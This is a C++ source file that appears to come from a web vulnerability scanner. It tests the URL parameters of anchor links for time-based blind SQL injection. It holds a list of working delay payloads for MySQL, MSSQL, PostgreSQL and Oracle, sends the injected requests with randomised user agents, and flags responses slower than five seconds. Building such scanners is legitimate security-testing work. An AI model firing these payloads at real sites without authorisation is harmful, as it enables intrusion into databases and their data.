/*
 * BP-WebExploitationRunBlindSQLiAnchorChecks.cc
 *
 *  Created on: Dec 13, 2011
 *      Author: root
 */

#include "../../../../include/BP-Main.h"


// Checks an anchor for  blind sqli and stores results in assessment.
P_BP_WEB_BLIND_SQLINJ_TEST_RESULT BP_WebAssessmentCheckAnchorForBlindSQLi(P_BP_WEB_ASSESSMENT assessment, P_BP_HTML_ANCHOR_LIST anchor)
{

	// ensure we don't have a null assessment or anchor pointer
	if(!assessment || !anchor)
		return NULL;

	// ####################################################################
	// ########## Parameter Matrix ########################################
	// ####################################################################

	// Static Blind SQLi Test Strings.  Remember to propagate any changes made here to
	// the global array in BP-WebExploitationRunBlindSQLiFormChecks.cc.
	char *global_blind_sqli_time_based_test_strings_anchors[] = {
			/*mysql delay tests*/
			" OR (SELECT SLEEP(10))--%20",
			" OR SLEEP(10)-- %20",
			" OR SLEEP(10) ",
			"1 OR SLEEP(10) ",
			" WHERE (SELECT SLEEP(10))--%20",
			"' or SLEEP(10)--%20 ",
			"\" or SLEEP(10)--%20 ",
			"' OR 1=(SELECT SLEEP(10)) OR '1'='",
			/*mssql delay tests*/
			"OR IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"'; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"\"; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			/*postgres delay tests*/
			" OR (SELECT pg_sleep(10))--%20",
			" OR pg_sleep(10)-- %20",
			" OR pg_sleep(10) ",
			"1 OR pg_sleep(10) ",
			" WHERE (SELECT pg_sleep(10))--%20",
			"' or pg_sleep(10)--%20 ",
			"\" or pg_sleep(10)--%20 ",
			"' OR 1=(SELECT pg_sleep(10)) OR '1'='",
			/*oracle tests*/
			"1 OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) else 1",
			"1' or 1 = OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects)else 1 end –",
			"1\" OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects)else 1 end –",
			NULL
	};

	// generate blind tests
	// blind_tests = BP_WebExploitatinGenUnionSelectTestConditions(front_parts, assessment->bsqli_max_positions, random_test_str, random_test_int, true, true, assessment->bsqli_max_end_nesting);
	size_t n = 0;
	P_BP_WEB_BLIND_SQLINJ_TEST blind_tests = NULL;
	for(; global_blind_sqli_time_based_test_strings_anchors[n]; n++)
	{

		// allocate space for tests
		blind_tests = (P_BP_WEB_BLIND_SQLINJ_TEST) bprealloc(blind_tests, sizeof(BP_WEB_BLIND_SQLINJ_TEST) * (n+2));

		// zero structs and truncate end test position
		memset((void *) &blind_tests[n], 0x00, sizeof(BP_WEB_BLIND_SQLINJ_TEST) * 2);

		// set actual tests
		blind_tests[n].testFront = global_blind_sqli_time_based_test_strings_anchors[n];
		blind_tests[n].type = BP_WEB_BLINDSQLI_TYPE_TIME_BENCHMARK;

	}

	// display the blind sql injection test set
	BP_DisplayBlindSQLiTestSet(blind_tests);

	// now generate union select and time tests
	char *blindSqlTest = NULL;

	// Retrieves the variable count from an anchor based
	// on the delimiter set used for parsing.
	size_t anchorVarCount = HTMLGetAnchorVarCount(anchor->vars);

	// if the anchor count is 0, we can skip to the next anchor
	// element.
	if (!anchorVarCount)
		return NULL;

	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%% Blind SQLi Checks %%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// outer individual injection test loop iter
	size_t i = 0;

	// inner individual parameter loop iter
	size_t x = 0;

	// calculated anchor length
	size_t anchorLen = 0;

	// actual anchor test to use
	char *anchorTest = NULL;

	// browser string
	char *browserStr = NULL;

	// unicode string used for making requests
	char * unicodeSpaceEncodeStr = NULL;

	// Match set utilized during the index matching
	P_BP_WEB_ANALYSIS_RESULT_INDEX_SET indexSet = NULL;

	// set the curl timeout to a larger value in order
	// to detect problems.
	curl_easy_setopt(assessment->session->curl, CURLOPT_TIMEOUT, 15);

	// walk xss checks in the assessment (all checks per var)
	for (i = 0; ; i++)
	{

		// test is required to have a test front
		if(!blind_tests[i].testFront)
			break;

		// printf("\n blindsqli anchor test front: %s", blind_tests[i].testFront);

		// now walk individual anchor variables
		for (x = 0; x < anchorVarCount; x++)
		{

			// set base url + max lengths (bpstrlen is safe due to bpstrndup allocation)
			anchorLen = strnlen(assessment->baseAssessmentURL, 2048);

			// this routine gets a count of the character composition of anchor
			anchorLen += BP_GetAnchorVarMaxLengths(anchor->vars);

			// add front and tail check lengths to the total
			if(blind_tests[i].testFront)
				anchorLen += strnlen(blind_tests[i].testFront, 2048);
			if(blind_tests[i].testTail)
				anchorLen += strnlen(blind_tests[i].testTail, 2048);

			// add max embedded length
			anchorLen += BP_MAX_EMBEDDED_ANCHOR_TEST_LENGTH;

			// substitute variable at position
			anchorTest = BP_WebExploitationGetAnchorRelativeTestTarget(assessment, anchor, anchorLen);


			// %%%%%%%%%% BEGIN BLIND SQLI TESTS %%%%%%%%%%%%%%%%%%%%%%%%%%

			// generate the xss test
			blindSqlTest = BP_WebAssessmentGenerateBlindSQLiAnchorTestSet(anchorTest, &blind_tests[i], anchor->vars, anchor->delims, NULL, x);

			// continue loop if there is no xss test here
			if(!blindSqlTest)
				continue;

			// run request against anchor
			unicodeSpaceEncodeStr = BP_GenUnicodeSpaceString(blindSqlTest, bpstrlen(blindSqlTest));

			// bpfree browser string on loop if set
			if (browserStr)
			{
				bpfree(browserStr);
				browserStr = NULL;
			}

			// enable browser pool randomization
			if (assessment->randomizeBrowserStrsBetweenRequests)
			{
				browserStr = BP_HTTPGetRandomUserAgentString(assessment->userAgentPool, assessment->userAgentCount);
				BP_HTTPUserAgent(assessment->session, browserStr);
			}

			// generate exploit request set
			P_BP_WEB_EXPLOIT_REQUEST_SET ers = BP_GenWebExploitRequestSet(unicodeSpaceEncodeStr, NULL);

			// run the actual test, continue if not-possible
			if(BP_RunWebExploitRequestSet(assessment, ers, assessment->http_request_max_retries) != ERR_SUCCESS)
			{
				BP_DestroyWebExploitRequestSet(ers);
				// printf("\n Cannot run exploit request set?!  Returning failure?!");
				continue;
			}

			// display the exploit request set
			BP_DisplayExploitRequestSet(ers);

			// check the request time to match a delay injection
			if(assessment->session->req_time_s > 5)
			{
				// increase the result counter
				assessment->bsqli_result_count++;
				assessment->bsqli_results = (P_BP_WEB_BLIND_SQLINJ_TEST_RESULT) bprealloc(assessment->bsqli_results, sizeof(BP_WEB_BLIND_SQLINJ_TEST_RESULT) * (assessment->bsqli_result_count+1) );

				// zero out new positions (current and truncating positions)
				memset(&assessment->bsqli_results[assessment->bsqli_result_count-1], 0x00, sizeof(BP_WEB_BLIND_SQLINJ_TEST_RESULT) * 2);

				// set the database identifiers in the class
				assessment->bsqli_results[assessment->bsqli_result_count-1].db_result_id = assessment->db_result_id;

				// now set the db request
				assessment->bsqli_results[assessment->bsqli_result_count-1].db_request_log_id = assessment->db_http_last_request_made_id;

				// set the http get string
				if(ers->get_str)
					assessment->bsqli_results[assessment->bsqli_result_count-1].http_get = bpstrdup(ers->get_str);
				if(ers->post_str)
					assessment->bsqli_results[assessment->bsqli_result_count-1].http_post = bpstrdup(ers->post_str);

				// the blind sqli detected type
				assessment->bsqli_results[assessment->bsqli_result_count-1].type = BP_WEB_BLINDSQLI_TYPE_TIME_BENCHMARK;

				// set the result time
				assessment->bsqli_results[assessment->bsqli_result_count-1].actual_request_time = assessment->session->req_time_s;

				// send email if required
				if(assessment->send_notification_email_on_confirmed_or_blind_sqli)
				{

					// set find strings
					char * find_strs[] = {
						"BASE_HREF",
						"HTTP_GET_DATA",
						"HTTP_POST_DATA",
						"HTTP_COOKIE_DATA",
						NULL,
					};

					// set replace strings
					char * replace_strs[] = {
						assessment->baseAssessmentURL,
						ers->get_str,
						ers->post_str,
						ers->cookie_str,
						NULL
					};

					if(!replace_strs[0])
						replace_strs[0] = "";
					if(!replace_strs[1])
						replace_strs[1] = "";
					if(!replace_strs[2])
						replace_strs[2] = "";
					if(!replace_strs[3])
						replace_strs[3] = "";

					char *email_send_str = BP_GenerateSubstitutedTemplate(assessment->email_confirmed_or_blind_sqli_template, find_strs, replace_strs);


				    // attempt to send new message
				    BP_SendEmailMessage(
				    		   assessment->email_smtp_username,
				    		   assessment->email_smtp_password,
				    		   assessment->email_smtp_server,
				               assessment->email_smtp_from,
				               assessment->notification_emails,
							   /* Message Body including Subject */
							   "Subject: SQLi Found and Exploited (time-delay):",
							   "A sql injection has been found (blind/no-error message)."
					);
				}

				break;

			}

			// if the browser string was not destroyed, destroy it here
			if (browserStr)
			{
				bpfree(browserStr);
				browserStr = NULL;
			}

			// destroy unicode string
			if (unicodeSpaceEncodeStr)
				bpfree(unicodeSpaceEncodeStr);

			// reset unicode pointer
			unicodeSpaceEncodeStr = NULL;

			// zero out anchor test
			memset(anchorTest, 0x00, anchorLen);

			// destroy xss test string
			if (blindSqlTest)
			{
				bpfree(blindSqlTest);
				blindSqlTest = NULL;
			}

			// Destroy the session page memory pointers before running
			if (assessment->session->page->memPtr != NULL)
			{
				bpfree(assessment->session->page->memPtr);
				assessment->session->page->memPtr = NULL;
				assessment->session->page->size = 0;
			}

			if(ers)
			{
				BP_DestroyWebExploitRequestSet(ers);
				ers = NULL;
			}

		}
	} // END ANCHOR XSS TESTS

	// destroy xss test string
	if (blindSqlTest)
	{
		bpfree(blindSqlTest);
		blindSqlTest = NULL;
	}

	// destroy encoded string
	if (unicodeSpaceEncodeStr)
	{
		bpfree(unicodeSpaceEncodeStr);
		unicodeSpaceEncodeStr = NULL;
	}

	// destroy anchor test if set
	if (anchorTest)
	{
		bpfree(anchorTest);
		anchorTest = NULL;
	}

	// Destroy assessment last retrieved buffer content
	if (assessment->session->page->memPtr != NULL)
	{
		bpfree(assessment->session->page->memPtr);
		assessment->session->page->memPtr = NULL;
		assessment->session->page->size = 0;
	}

	// return the result set
	return NULL;

}
